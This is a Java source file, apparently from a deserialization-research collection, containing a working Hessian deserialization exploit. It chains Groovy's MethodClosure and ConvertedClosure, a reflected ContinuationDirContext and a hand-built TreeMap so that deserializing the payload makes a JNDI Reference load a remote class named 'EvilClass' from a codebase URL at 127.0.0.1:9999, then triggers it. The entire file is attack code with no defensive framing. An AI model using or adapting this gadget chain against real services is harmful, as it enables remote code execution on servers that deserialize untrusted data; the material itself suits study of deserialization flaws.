package org.su18.serialize.hessian.Groovy;


import org.codehaus.groovy.runtime.ConvertedClosure;
import org.codehaus.groovy.runtime.MethodClosure;
import org.su18.serialize.utils.HessianUtils;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Proxy;
import java.util.Hashtable;
import java.util.TreeMap;

/**
 * @author su18
 */
public class Groovy1 {

	public static void main(String[] args) throws Exception {

		String codebase = "http://127.0.0.1:9999/";
		String clazz    = "org.su18.serialize.test.EvilClass";

		Class<?>       ccCl   = Class.forName("javax.naming.spi.ContinuationDirContext");
		Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
		ccCons.setAccessible(true);
		CannotProceedException cpe = new CannotProceedException();

		Field f1 = Throwable.class.getDeclaredField("cause");
		f1.setAccessible(true);
		f1.set(cpe, null);

		Field f2 = Throwable.class.getDeclaredField("stackTrace");
		f2.setAccessible(true);
		f2.set(cpe, null);

		cpe.setResolvedObj(new Reference("su18", clazz, codebase));

		Field f3 = Throwable.class.getDeclaredField("suppressedExceptions");
		f3.setAccessible(true);
		f3.set(cpe, null);


		DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());

		MethodClosure    closure          = new MethodClosure(ctx, "listBindings");
		ConvertedClosure convertedClosure = new ConvertedClosure(closure, "compareTo");
		Object map = Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class<?>[]{Comparable.class},
				convertedClosure);


		TreeMap<Object, Object> m = new TreeMap<>();


		Field f4 = TreeMap.class.getDeclaredField("size");
		f4.setAccessible(true);
		f4.set(m, 2);

		Field f5 = TreeMap.class.getDeclaredField("modCount");
		f5.setAccessible(true);
		f5.set(m, 2);

		Class<?>    nodeC    = Class.forName("java.util.TreeMap$Entry");
		Constructor nodeCons = nodeC.getDeclaredConstructor(Object.class, Object.class, nodeC);
		nodeCons.setAccessible(true);

		Object node  = nodeCons.newInstance("su18", new Object[0], null);
		Object right = nodeCons.newInstance(map, new Object[0], node);

		Field f6 = nodeC.getDeclaredField("right");
		f6.setAccessible(true);
		f6.set(node, right);


		Field f7 = TreeMap.class.getDeclaredField("root");
		f7.setAccessible(true);
		f7.set(m, node);

		byte[] baos = HessianUtils.hessianSerialize(m, "hessian2");
		HessianUtils.hessianSerializeToObj(baos, "hessian2");
	}

}
